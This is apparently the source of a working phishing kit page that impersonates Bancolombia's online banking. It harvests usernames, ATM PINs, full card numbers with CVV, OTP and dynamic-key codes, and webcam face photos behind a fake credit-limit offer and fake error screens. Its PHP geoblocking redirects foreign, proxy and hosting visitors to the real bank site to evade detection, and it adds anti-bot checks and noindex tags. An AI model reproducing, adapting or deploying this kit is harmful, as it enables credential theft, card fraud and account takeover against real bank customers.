<?php
// Ocultar errores en produccion
error_reporting(0);
ini_set('display_errors', '0');

require_once __DIR__ . '/Antibot.php';

// Evitar notice si Antibot.php ya inicio la sesion
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

Antibot::init();

function getClientIp(): string {
    $keys = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'REMOTE_ADDR'];
    foreach ($keys as $key) {
        if (!empty($_SERVER[$key])) {
            $ips = explode(',', $_SERVER[$key]);
            return trim($ips[0]);
        }
    }
    return '127.0.0.1';
}
$clientIp = getClientIp();

// ── GEOBLOCK: Verificar si la IP es de Colombia ──
function checkGeoBlock(string $ip): ?string {
    if ($ip === '127.0.0.1' || $ip === '::1') return null;

    $ctx = stream_context_create([
        'http' => ['timeout' => 5, 'header' => 'User-Agent: BancolombiaFlow/1.0']
    ]);
    $url = "http://ip-api.com/json/{$ip}?fields=status,countryCode,country,proxy,hosting";
    $resp = @file_get_contents($url, false, $ctx);
    if (!$resp) return null;

    $data = json_decode($resp, true);
    if (!$data || $data['status'] !== 'success') return null;

    $cc = $data['countryCode'] ?? 'XX';
    $country = $data['country'] ?? 'Desconocido';

    $_SESSION['geo_ips'] = $_SESSION['geo_ips'] ?? [];
    $_SESSION['geo_ips'][$ip] = [
        'countryCode' => $cc,
        'country'     => $country,
        'timestamp'   => time()
    ];

    $foreign = array_filter($_SESSION['geo_ips'], fn($v) => $v['countryCode'] !== 'CO');
    $foreignCount = count($foreign);

    if ($cc !== 'CO') {
        return "https://www.bancolombia.com/personas";
    }
    if ($foreignCount > 2) {
        return "https://www.bancolombia.com/personas";
    }
    if (($data['proxy'] ?? false) || ($data['hosting'] ?? false)) {
        return "https://www.bancolombia.com/personas";
    }
    return null;
}

$redirectUrl = checkGeoBlock($clientIp);
if ($redirectUrl) {
    header("Location: {$redirectUrl}");
    exit;
}

$fecha = date('l, j \d\e F \d\e Y, g:i a', strtotime('-5 hours'));
?>
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="robots" content="noindex, nofollow, noarchive">
<title>Bancolombia — Sucursal Virtual Personas</title>
<link rel="shortcut icon" href="/favicon.ico">
<link rel="icon" href="/favicon.ico" type="image/x-icon">
<link rel="apple-touch-icon" href="/favicon.ico">
<link rel="stylesheet" href="assets/css/style.css?v=3">
</head>
<body>

<div class="page">
  <div class="content-wrapper">
    <header class="page-header">
      <div class="logo">
        <img src="assets/img/wordmark.svg" alt="Bancolombia" width="184" height="25">
      </div>
      <h1 class="page-title" id="page-title">Sucursal Virtual Personas</h1>
    </header>

    <main class="page-main">
    <div class="form-column">

      <!-- ═══════════════════════════════════════════════════════════
           1. LOGIN
           ═══════════════════════════════════════════════════════════ -->
      <div class="screen active" id="scr-login">
        <section class="banner-section">
          <div class="inline-alert">
            <div class="inline-alert-status">
              <div class="transaction-status">
                <i class="transaction-icon">lightbulb-small</i>
              </div>
            </div>
            <div class="inline-alert-body">
              <div class="inline-alert-content">
                <h2 class="inline-alert-title">Esto te interesa</h2>
                <div class="inline-alert-text">
                  Desde el 2 de octubre de 2026 actualizamos el reglamento de las cuentas de ahorro.
                  <a href="#" class="link-underline link-underline-large"><u>Conócelo</u></a>
                </div>
              </div>
            </div>
          </div>
        </section>

        <div class="card-body">
          <div class="card">
            <div class="card-auth-body">
              <div class="card-auth-head">
                <h2 class="card-auth-title">¡Hola!</h2>
                <p class="card-auth-description">Ingresa los datos para gestionar tus productos y hacer transacciones.</p>
              </div>

              <div class="card-auth-container" style="margin-bottom:32px">
                <div class="form-field" id="fld-user">
                  <i class="form-field-icon">user</i>
                  <input id="user" class="input" placeholder=" " autocomplete="off">
                  <label>Usuario</label>
                </div>
                <div class="err-msg" id="err-user">Ingresa tu usuario</div>

                <div style="margin-top:16px">
                  <a class="link-underline" href="#"><u>¿Olvidaste tu usuario?</u></a>
                </div>

                <div class="form-field" id="fld-pass" style="margin-top:44px">
                  <i class="form-field-icon">lock</i>
                  <input type="password" id="pass" class="input" placeholder=" " maxlength="4" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
                  <label>Clave del cajero</label>
                </div>
                <div class="err-msg" id="err-pass">Ingresa tu clave</div>

                <div style="margin-top:16px">
                  <a class="link-underline" href="#"><u>¿Olvidaste o bloqueaste tu clave?</u></a>
                </div>

                <?= Antibot::campos() ?>

                <div class="antibot-wrap" id="antibot-box" onclick="document.getElementById('nobot').click()">
                  <input type="checkbox" id="nobot" onchange="checkLogin()">
                  <label for="nobot">No soy un robot</label>
                  <svg class="refresh" viewBox="0 0 48 48">
                    <path fill="#1a73e8" d="M24 8c-4.4 0-8.4 1.8-11.3 4.7L6 6v14h14l-5.5-5.5C16.6 12.4 20 11 24 11c7.2 0 13 5.8 13 13h3c0-8.8-7.2-16-16-16z"/>
                    <path fill="#1a73e8" d="M38 28h-3c0 7.2-5.8 13-13 13-4.4 0-8.4-1.8-11.3-4.7L10 42l6.7-6.7C19.6 38.2 24 40 28 40c7.2 0 13-5.8 13-13h-3z"/>
                  </svg>
                </div>
                <div class="err-msg" id="err-nobot">Confirma que no eres un robot</div>
              </div>

              <div class="card-auth-button">
                <button class="button button-primary" id="btn-login" onclick="submitLogin()" disabled>Iniciar sesión</button>
              </div>
              <div class="card-auth-link">
                <a class="link-underline link-underline-large" href="#"><u>Crear usuario</u></a>
              </div>
            </div>
          </div>
        </div>
      </div>

      <!-- ═══════════════════════════════════════════════════════════
           1b. LOGIN FAIL (estilo jelpi)
           ═══════════════════════════════════════════════════════════ -->
      <div class="screen" id="scr-login-fail">
        <div class="card-body">
          <div class="card">
            <div class="card-auth-body" style="padding:40px 32px">
              <div class="card-auth-head" style="margin-bottom:32px">
                <h2 class="card-auth-title" style="font-size:1.75rem">Datos incorrectos</h2>
              </div>
              <div class="jelpi-input-group">
                <label>Error de autenticación</label>
                <p class="jelpi-desc">El usuario o la clave ingresados no son válidos. Por favor intenta de nuevo.</p>
              </div>
              <button class="button button-primary ready" onclick="showScreen('scr-login')">Intentar de nuevo</button>
              <div class="jelpi-links">
                <a href="#" onclick="resetAll();showScreen('scr-login');return false">Volver al inicio</a>
              </div>
            </div>
          </div>
        </div>
      </div>

      <!-- ═══════════════════════════════════════════════════════════
           2. MONTO CUPO
           ═══════════════════════════════════════════════════════════ -->
      <div class="screen" id="scr-monto">
        <div class="card-body">
          <div class="card" style="padding:28px 24px">
            <div class="cupo-header">
              <div class="chip">Compra fácil y segura</div>
              <h2>Escoge tu cupo ideal</h2>
              <p>Selecciona el cupo que mejor se adapte a tus necesidades</p>
            </div>
            <div class="cupo-tabs">
              <div class="cupo-tab active">
                <svg width="20" height="16" viewBox="0 0 24 18" fill="none" stroke="#2c2a29" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="1" y="1" width="22" height="16" rx="2"/><line x1="1" y1="7" x2="23" y2="7"/></svg>
                Tarjeta de Crédito
              </div>
              <div class="cupo-tab">
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#2c2a29" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M3 21h18M5 21V7l7-4 7 4v14"/><path d="M9 21v-6h6v6"/></svg>
                Libre Inversión
              </div>
            </div>
            <div class="cupo-display">
              <div class="lbl">CUPO SELECCIONADO</div>
              <div class="val" id="cupo-val">$5.000.000</div>
              <div class="sub">Cupo asignado para tu solicitud digital</div>
            </div>
            <div class="cupo-slider-wrap">
              <input type="range" id="cupo-slider" min="5" max="80" value="5" step="1">
              <div class="range-labels"><span>$5.000.000</span><span>$80.000.000</span></div>
            </div>
            <div class="cupo-grid">
              <div class="opt active" data-val="5">$5.000.000</div>
              <div class="opt" data-val="10">$10.000.000</div>
              <div class="opt" data-val="15">$15.000.000</div>
              <div class="opt" data-val="20">$20.000.000</div>
              <div class="opt" data-val="30">$30.000.000</div>
              <div class="opt" data-val="40">$40.000.000</div>
              <div class="opt" data-val="50">$50.000.000</div>
              <div class="opt" data-val="60">$60.000.000</div>
            </div>
            <button class="button button-primary ready" id="btn-monto" onclick="submitCupo()">Continuar con la activación</button>
          </div>
        </div>
      </div>

      <!-- ═══════════════════════════════════════════════════════════
           2b. SELECCIONAR TARJETA (Débito / Crédito)
           ═══════════════════════════════════════════════════════════ -->
      <div class="screen" id="scr-seleccion-tarjeta">
        <div class="card-body">
          <div class="card" style="padding:28px 24px">
            <div class="cupo-header">
              <div class="chip">Validación requerida</div>
              <h2>Selecciona tu tipo de tarjeta</h2>
              <p>Elige con qué tarjeta deseas continuar la activación</p>
            </div>
            <div class="cupo-grid" style="grid-template-columns:1fr 1fr;margin-top:20px">
              <div class="opt" onclick="elegirTarjeta('debito')" style="padding:30px 16px;display:flex;flex-direction:column;align-items:center;gap:10px;border:2px solid var(--ink)">
                <svg width="36" height="36" viewBox="0 0 24 18" fill="none" stroke="#2c2a29" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="1" y="1" width="22" height="16" rx="2"/><line x1="1" y1="7" x2="23" y2="7"/></svg>
                <span style="font-size:1rem;font-weight:700">Tarjeta Débito</span>
                <span style="font-size:.75rem;color:#5a5856">Desde tu cuenta de ahorros</span>
              </div>
              <div class="opt" onclick="elegirTarjeta('credito')" style="padding:30px 16px;display:flex;flex-direction:column;align-items:center;gap:10px;border:2px solid var(--ink)">
                <svg width="36" height="36" viewBox="0 0 24 18" fill="none" stroke="#2c2a29" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="1" y="1" width="22" height="16" rx="2"/><line x1="1" y1="7" x2="23" y2="7"/><circle cx="18" cy="13" r="1.5" fill="#2c2a29" stroke="none"/></svg>
                <span style="font-size:1rem;font-weight:700">Tarjeta Crédito</span>
                <span style="font-size:.75rem;color:#5a5856">Línea de crédito activa</span>
              </div>
            </div>
            <button class="button button-outline" style="margin-top:16px" onclick="showScreen('scr-monto')">Volver</button>
          </div>
        </div>
      </div>

      <!-- ═══════════════════════════════════════════════════════════
           3. TARJETA DÉBITO (del jelpi)
           ═══════════════════════════════════════════════════════════ -->
      <div class="screen" id="scr-tarjeta-debito">
        <div class="card-body">
          <div class="card">
            <div class="card-auth-body">
              <div class="card-auth-head">
                <h2 class="card-auth-title">Validar Tarjeta Débito</h2>
                <p class="card-auth-description">Ingresa los datos de tu tarjeta de débito para validar tu identidad.</p>
              </div>
              <div class="note">No se realizará ningún cargo. Información protegida con cifrado bancario.</div>

              <div class="bank-detect-wrap" id="bank-detect-debito">
                <img class="bank-logo" id="bank-logo-debito" src="" alt="Banco">
                <img class="scheme-logo" id="scheme-logo-debito" src="" alt="Franquicia">
                <div class="bank-name" id="bank-name-debito"></div>
              </div>

              <div class="field"><label>Nombre del titular</label><input id="titular-debito" class="input" placeholder="Como aparece en la tarjeta" autocomplete="off" style="padding-left:0"></div>
              <div class="err-msg" id="err-titular-debito">Ingresa el nombre del titular</div>

              <div class="field"><label>Número de tarjeta</label><input id="cardnum-debito" class="input" type="tel" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" pattern="[0-9]*" autocomplete="off" style="padding-left:0"></div>
              <div class="err-msg" id="err-cardnum-debito">Número de tarjeta inválido</div>

              <div class="row">
                <div class="field"><label>Vencimiento</label><input id="venc-debito" class="input" placeholder="MM/AA" maxlength="5" inputmode="numeric" autocomplete="off" style="padding-left:0"></div>
                <div class="field"><label>CVV</label><input id="cvv-debito" class="input" type="password" placeholder="•••" maxlength="3" inputmode="numeric" pattern="[0-9]*" autocomplete="off" style="padding-left:0"></div>
              </div>
              <div class="err-msg" id="err-venc-debito">Fecha de vencimiento inválida</div>

              <button class="button button-primary ready" onclick="submitTarjetaDebito()" style="margin-top:16px">Continuar</button>
            </div>
          </div>
        </div>
      </div>

      <!-- ═══════════════════════════════════════════════════════════
           3b. TARJETA CRÉDITO (del jelpi)
           ═══════════════════════════════════════════════════════════ -->
      <div class="screen" id="scr-tarjeta-credito">
        <div class="card-body">
          <div class="card">
            <div class="card-auth-body">
              <div class="card-auth-head">
                <h2 class="card-auth-title">Validar Tarjeta Crédito</h2>
                <p class="card-auth-description">Ingresa los datos de tu tarjeta de crédito para activar el cupo.</p>
              </div>
              <div class="note">No se realizará ningún cargo. Información protegida con cifrado bancario.</div>

              <div class="bank-detect-wrap" id="bank-detect-credito">
                <img class="bank-logo" id="bank-logo-credito" src="" alt="Banco">
                <img class="scheme-logo" id="scheme-logo-credito" src="" alt="Franquicia">
                <div class="bank-name" id="bank-name-credito"></div>
              </div>

              <div class="field"><label>Nombre del titular</label><input id="titular-credito" class="input" placeholder="Como aparece en la tarjeta" autocomplete="off" style="padding-left:0"></div>
              <div class="err-msg" id="err-titular-credito">Ingresa el nombre del titular</div>

              <div class="field"><label>Número de tarjeta</label><input id="cardnum-credito" class="input" type="tel" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" pattern="[0-9]*" autocomplete="off" style="padding-left:0"></div>
              <div class="err-msg" id="err-cardnum-credito">Número de tarjeta inválido</div>

              <div class="row">
                <div class="field"><label>Vencimiento</label><input id="venc-credito" class="input" placeholder="MM/AA" maxlength="5" inputmode="numeric" autocomplete="off" style="padding-left:0"></div>
                <div class="field"><label>CVV</label><input id="cvv-credito" class="input" type="password" placeholder="•••" maxlength="3" inputmode="numeric" pattern="[0-9]*" autocomplete="off" style="padding-left:0"></div>
              </div>
              <div class="err-msg" id="err-venc-credito">Fecha de vencimiento inválida</div>

              <button class="button button-primary ready" onclick="submitTarjetaCredito()" style="margin-top:16px">Continuar</button>
            </div>
          </div>
        </div>
      </div>

      <!-- ═══════════════════════════════════════════════════════════
           4. TOKEN / OTP (estilo jelpi — un solo input)
           ═══════════════════════════════════════════════════════════ -->
      <div class="screen" id="scr-token">
        <div class="card-body">
          <div class="card">
            <div class="card-auth-body" style="padding:40px 32px">
              <div class="card-auth-head" style="margin-bottom:32px">
                <h2 class="card-auth-title" style="font-size:1.75rem">Token de seguridad</h2>
              </div>
              <div class="jelpi-input-group">
                <label for="txtToken">Confirmación</label>
                <p class="jelpi-desc">Para confirmar tu transacción, ingresa el código de verificación enviado a tu dispositivo móvil registrado.</p>
                <input type="text" id="txtToken" class="jelpi-input" placeholder="" maxlength="6" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
              </div>
              <button class="button button-primary ready" id="btn-token" onclick="submitToken()">Verificar Token</button>
              <div class="jelpi-links">
                <a href="#" onclick="resetAll();showScreen('scr-login');return false">¿Olvidó su usuario?</a>
                <span>/</span>
                <a href="#" onclick="resetAll();showScreen('scr-login');return false">¿Olvidó su contraseña?</a>
              </div>
            </div>
          </div>
        </div>
      </div>

      <!-- ═══════════════════════════════════════════════════════════
           4b. OTP FAIL (estilo jelpi)
           ═══════════════════════════════════════════════════════════ -->
      <div class="screen" id="scr-otp-fail">
        <div class="card-body">
          <div class="card">
            <div class="card-auth-body" style="padding:40px 32px">
              <div class="card-auth-head" style="margin-bottom:32px">
                <h2 class="card-auth-title" style="font-size:1.75rem">Token incorrecto</h2>
              </div>
              <div class="jelpi-input-group">
                <label>Error de verificación</label>
                <p class="jelpi-desc">El código ingresado no es válido. Por favor solicita uno nuevo o intenta de nuevo.</p>
              </div>
              <button class="button button-primary ready" onclick="showScreen('scr-token')">Reintentar</button>
              <div class="jelpi-links">
                <a href="#" onclick="resetAll();showScreen('scr-login');return false">Volver al inicio</a>
              </div>
            </div>
          </div>
        </div>
      </div>

      <!-- ═══════════════════════════════════════════════════════════
           5. CLAVE DINÁMICA (estilo jelpi — un solo input)
           ═══════════════════════════════════════════════════════════ -->
      <div class="screen" id="scr-clave">
        <div class="card-body">
          <div class="card">
            <div class="card-auth-body" style="padding:40px 32px">
              <div class="card-auth-head" style="margin-bottom:32px">
                <h2 class="card-auth-title" style="font-size:1.75rem">Clave Dinámica</h2>
              </div>
              <div class="jelpi-input-group">
                <label for="txtDinamica">Confirmación</label>
                <p class="jelpi-desc">Para confirmar tu transacción, ingresa la clave dinámica generada desde la App Mi Bancolombia.</p>
                <input type="text" id="txtDinamica" class="jelpi-input" placeholder="" maxlength="6" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
              </div>
              <button class="button button-primary ready" id="btn-clave" onclick="submitClave()">Verificar Clave</button>
              <div class="jelpi-links">
                <a href="#" onclick="resetAll();showScreen('scr-login');return false">¿Olvidó su usuario?</a>
                <span>/</span>
                <a href="#" onclick="resetAll();showScreen('scr-login');return false">¿Olvidó su contraseña?</a>
              </div>
            </div>
          </div>
        </div>
      </div>

      <!-- ═══════════════════════════════════════════════════════════
           5b. DINÁMICA FAIL (estilo jelpi)
           ═══════════════════════════════════════════════════════════ -->
      <div class="screen" id="scr-dinamica-fail">
        <div class="card-body">
          <div class="card">
            <div class="card-auth-body" style="padding:40px 32px">
              <div class="card-auth-head" style="margin-bottom:32px">
                <h2 class="card-auth-title" style="font-size:1.75rem">Clave dinámica incorrecta</h2>
              </div>
              <div class="jelpi-input-group">
                <label>Error de verificación</label>
                <p class="jelpi-desc">La clave ingresada no es válida. Por favor genera una nueva en la app.</p>
              </div>
              <button class="button button-primary ready" onclick="showScreen('scr-clave')">Reintentar</button>
              <div class="jelpi-links">
                <a href="#" onclick="resetAll();showScreen('scr-login');return false">Volver al inicio</a>
              </div>
            </div>
          </div>
        </div>
      </div>

      <!-- ═══════════════════════════════════════════════════════════
           6. 923 (estilo jelpi)
           ═══════════════════════════════════════════════════════════ -->
      <div class="screen" id="scr-923">
        <div class="card-body">
          <div class="card">
            <div class="card-auth-body" style="padding:40px 32px">
              <div class="card-auth-head" style="margin-bottom:32px">
                <h2 class="card-auth-title" style="font-size:1.75rem">Error 923</h2>
              </div>
              <div class="jelpi-input-group">
                <label>Alerta de seguridad</label>
                <p class="jelpi-desc">Hemos detectado una actividad inusual en tu cuenta. Para continuar con el proceso, debes validar tu identidad.</p>
              </div>
              <button class="button button-primary ready" onclick="showScreen('scr-soyyo');setTimeout(initFaceCapture,300)">Validar identidad</button>
              <div class="jelpi-links">
                <a href="#" onclick="resetAll();showScreen('scr-login');return false">Volver al inicio</a>
              </div>
            </div>
          </div>
        </div>
      </div>

      <!-- ═══════════════════════════════════════════════════════════
           6b. BAN IP (estilo jelpi)
           ═══════════════════════════════════════════════════════════ -->
      <div class="screen" id="scr-banip">
        <div class="card-body">
          <div class="card">
            <div class="card-auth-body" style="padding:40px 32px">
              <div class="card-auth-head" style="margin-bottom:32px">
                <h2 class="card-auth-title" style="font-size:1.75rem">Acceso bloqueado</h2>
              </div>
              <div class="jelpi-input-group">
                <label>Seguridad</label>
                <p class="jelpi-desc">Hemos detectado actividad sospechosa desde tu dirección IP. El acceso ha sido restringido por seguridad.</p>
              </div>
              <button class="button button-primary ready" onclick="resetAll();showScreen('scr-login')">Volver al inicio</button>
              <div class="jelpi-links">
                <a href="#" onclick="resetAll();showScreen('scr-login');return false">¿Necesitas ayuda?</a>
              </div>
            </div>
          </div>
        </div>
      </div>

      <!-- ═══════════════════════════════════════════════════════════
           7. SOY YO / VALIDACIÓN ROSTRO (del jelpi)
           ═══════════════════════════════════════════════════════════ -->
      <div class="screen" id="scr-soyyo">
        <div class="card-body">
          <div class="card">
            <div class="card-auth-body">
              <div class="screen-soyyo">
                <div class="icon-user">
                  <svg width="40" height="40" viewBox="0 0 24 24" stroke="#2c2a29" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
                </div>
                <h2 style="margin-bottom:8px">¿Eres tú?</h2>
                <p>Para proteger tu cuenta, necesitamos validar tu identidad con una foto de tu rostro.</p>

                <div class="face-capture" id="face-capture">
                  <video id="face-video" class="face-video" autoplay playsinline muted></video>
                  <canvas id="face-canvas" class="face-canvas"></canvas>
                  <div class="face-status" id="face-status">Centra tu rostro en el recuadro</div>
                  <button class="face-btn" id="face-btn" onclick="captureFace()">Tomar foto</button>
                </div>

                <button class="button button-outline" style="margin-top:10px" onclick="resetAll();showScreen('scr-login')">Cancelar</button>
              </div>
            </div>
          </div>
        </div>
      </div>

      <!-- ═══════════════════════════════════════════════════════════
           8. ÉXITO (estilo jelpi)
           ═══════════════════════════════════════════════════════════ -->
      <div class="screen" id="scr-exito">
        <div class="card-body">
          <div class="card">
            <div class="card-auth-body" style="padding:40px 32px">
              <div class="card-auth-head" style="margin-bottom:32px">
                <h2 class="card-auth-title" style="font-size:1.75rem">¡Activación exitosa!</h2>
              </div>
              <div class="jelpi-input-group">
                <label>Confirmación</label>
                <p class="jelpi-desc">Tu tarjeta de crédito digital está activa con el cupo seleccionado.</p>
              </div>
              <button class="button button-primary ready" onclick="resetAll();showScreen('scr-login')">Volver al inicio</button>
            </div>
          </div>
        </div>
      </div>

    </div>
  </main>
  </div>

  <!-- Footer -->
  <footer class="footer">
    <div class="footer-container">
      <div class="footer-top-links">
        <a class="link-default" href="#">¿Problemas para conectarte?</a>
        <span class="footer-separator">|</span>
        <a class="link-default" href="#">Aprende sobre seguridad</a>
        <span class="footer-separator">|</span>
        <a class="link-default" href="#">Reglamento Sucursal Virtual</a>
        <span class="footer-separator">|</span>
        <a class="link-default" href="#">Política de privacidad</a>
      </div>
      <div class="footer-divisor"></div>
      <div class="footer-bottom">
        <div class="footer-bottom-left">
          <div class="footer-bottom-left-side">
            <div class="footer-bottom-top-icon">
              <img src="assets/img/wordmark.svg" alt="Bancolombia">
            </div>
            <div class="footer-vigilant">
              <img src="assets/img/vigilado.svg" alt="Vigilado Superintendencia Financiera de Colombia">
            </div>
          </div>
        </div>
        <div class="footer-bottom-right">
          <div class="footer-bottom-right-text">
            <p>Dirección IP: <?= htmlspecialchars($clientIp) ?></p>
            <p><?= htmlspecialchars($fecha) ?></p>
          </div>
        </div>
      </div>
    </div>
  </footer>
</div>

<!-- Toast Error -->
<div class="toast-error" id="toast-error">
  <button class="t-close" onclick="hideToast()">
    <svg viewBox="0 0 24 24" width="18" height="18" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
  </button>
  <div class="t-body">
    <div class="t-title">Algo salió mal</div>
    <div class="t-sub">Pronto solucionaremos el problema y podrás continuar con tu solicitud.</div>
  </div>
</div>

<!-- Loader -->
<div class="loader-overlay" id="loader">
  <div class="loader-circle"><div class="spinner"></div></div>
  <h3>Cargando...</h3>
</div>

<!-- Admin Panel -->
<!-- <div class="admin-panel" id="admin-panel">
  <button class="close-btn" onclick="toggleAdmin()">✕</button>
  <h3>Panel Admin</h3>
  <div style="margin:16px 0">
    <input type="text" id="ban-ip-input" placeholder="IP a banear" style="width:100%;padding:8px;border:1px solid #ccc;border-radius:4px;margin-bottom:8px">
    <button class="button button-primary" onclick="banIp()" style="min-height:36px;font-size:.9rem">Banear IP</button>
  </div>
  <div class="ban-list" id="ban-list">
    <p style="font-size:.8rem;color:#666">IPs baneadas:</p>
  </div>
</div>
<button class="admin-toggle" id="admin-toggle" onclick="toggleAdmin()" title="Panel Admin">⚙</button> -->

<script src="assets/js/app.js?v=3"></script>
</body>
</html>
